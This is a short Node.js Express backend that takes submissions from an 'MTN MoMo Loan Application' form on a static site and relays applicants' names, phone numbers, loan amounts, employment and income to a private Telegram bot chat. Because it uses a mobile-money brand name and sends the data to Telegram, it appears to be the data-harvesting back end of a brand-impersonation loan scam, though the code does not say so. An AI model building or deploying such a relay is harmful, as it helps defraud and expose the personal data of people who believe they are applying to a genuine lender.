// Render Web Service — Telegram form backend
// Receives POST from your static site, forwards to Telegram

const express = require('express');
const cors = require('cors');

const app = express();

// Trust Render's proxy (so req.ip works correctly)
app.set('trust proxy', 1);

// Middleware
app.use(cors()); // Allow requests from your static site
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Health check endpoint (Render pings this)
app.get('/', (req, res) => {
  res.json({ status: 'ok', service: 'MTN MoMo Telegram Backend' });
});

// Main form submission endpoint
app.post('/submit', async (req, res) => {
  try {
    const {
      loan_type,
      loan_amount,
      loan_term,
      purpose,
      first_name,
      last_name,
      phone,
      employment,
      income,
    } = req.body;

    // Build the Telegram message
    const message = [
      '📋 *New MTN MoMo Loan Application*',
      '',
      `👤 *Applicant:* ${first_name || '—'} ${last_name || '—'}`,
      `📞 *Phone:* +260 ${phone || '—'}`,
      `💰 *Amount:* K ${loan_amount || '—'}`,
      `📅 *Term:* ${loan_term || '—'}`,
      `🏷️ *Type:* ${loan_type || '—'}`,
      `📝 *Purpose:* ${purpose || '—'}`,
      `💼 *Employment:* ${employment || '—'}`,
      `📊 *Annual Income:* K ${income || '—'}`,
      '',
      `🕐 ${new Date().toLocaleString('en-ZM', { timeZone: 'Africa/Lusaka' })}`,
    ].join('\n');

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;

    const tgResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const tgData = await tgResponse.json();

    if (!tgData.ok) {
      console.error('Telegram error:', tgData);
      return res.status(500).json({ success: false, error: tgData.description });
    }

    res.json({ success: true });
  } catch (err) {
    console.error('Server error:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
